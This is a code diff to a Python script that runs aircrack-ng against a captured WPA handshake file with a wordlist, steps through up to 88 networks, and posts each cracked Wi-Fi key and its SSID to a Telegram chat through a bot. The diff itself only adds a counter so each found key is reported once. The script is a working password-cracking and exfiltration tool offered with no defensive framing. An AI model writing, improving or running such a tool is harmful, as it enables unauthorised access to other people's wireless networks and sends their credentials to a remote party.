@@ -5,6 +5,7 @@ TELEGRAM_TOKEN = "TGTOKEN"
 TELEGRAM_CHAT_ID = -1
 #Telegram SOCKS5 PROXY
 
+maxrange = 0
 ssidlist = []
 def TelegramSend(out_string):
     try:
@@ -17,6 +18,7 @@ def TelegramSend(out_string):
 def GetSSID(firsttime,ssid):
     global ssidlist
     if firsttime == True:
+        global maxrange
         buflist = []
         p = Popen(['aircrack-ng', 'wpa.cap', '-w','wordlist.txt'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)  
         firstoutput = p.communicate()[0]
@@ -25,6 +27,7 @@ def GetSSID(firsttime,ssid):
         for item in buflist:
             if  (len(item)) == 4:
                 ssidlist.append(item)  
+        maxrange = len(ssidlist)
     else:
         for item in ssidlist:
             if item[0] == str(ssid):
@@ -33,6 +36,7 @@ def GetSSID(firsttime,ssid):
 GetSSID(True,"")
 
 for i in range (1,89):
+    keyfoundcounter = 0
     byteinput = str.encode(str(i))
     print("Working with ["+str(i)+"] "+GetSSID(False,i)+".. ")
     p = Popen(['aircrack-ng', 'wpa.cap', '-w','wordlist.txt'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)  
@@ -41,11 +45,12 @@ for i in range (1,89):
     for line in outputlines.splitlines():
         localessid =  GetSSID(False,i);
 
-        if "KEY FOUND!" in line:
+        if "KEY FOUND!" in line and keyfoundcounter == 0:
             s = line[line.find('KEY FOUND!'):]
             localekey = s[s.find("[")+len("["):s.rfind("]")].replace(" ","")
             TelegramSend("[KEY FOUND]\nSSID: "+localessid+"\nKEY: \""+localekey+"\"")
             print("[RESULT FOR "+localessid+"] -> KEY FOUND:"+" \'"+localekey+"\"")
+            keyfoundcounter = 1
 
         elif ("KEY NOT FOUND") in line:
             print("[RESULT FOR "+localessid+"] -> KEY NOT FOUND")
